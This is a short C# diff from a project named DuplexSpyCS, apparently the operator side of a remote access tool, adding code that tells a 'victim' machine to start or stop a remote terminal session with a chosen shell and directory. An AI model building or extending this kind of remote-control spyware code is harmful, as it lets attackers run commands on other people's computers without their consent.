@@ -103,6 +103,12 @@ namespace DuplexSpyCS
         private void frmXterm_FormClosed(object sender, FormClosedEventArgs e)
         {
             m_victim.m_listener.ReceivedDecoded -= fnRecv;
+
+            m_victim.fnSendCommand(new string[]
+            {
+                "xterm",
+                "stop",
+            });
         }
 
         private void frmXterm_SizeChanged(object sender, EventArgs e)
@@ -112,7 +118,7 @@ namespace DuplexSpyCS
 
         private void webView21_Resize(object sender, EventArgs e)
         {
-            
+
         }
 
         private void frmXterm_Resize(object sender, EventArgs e)
@@ -121,6 +127,17 @@ namespace DuplexSpyCS
             {
                 webView21.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
             }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            m_victim.fnSendCommand(new string[]
+            {
+                "xterm",
+                "start",
+                @textBox1.Text,
+                m_szInitDir,
+            });
         }
     }
 }
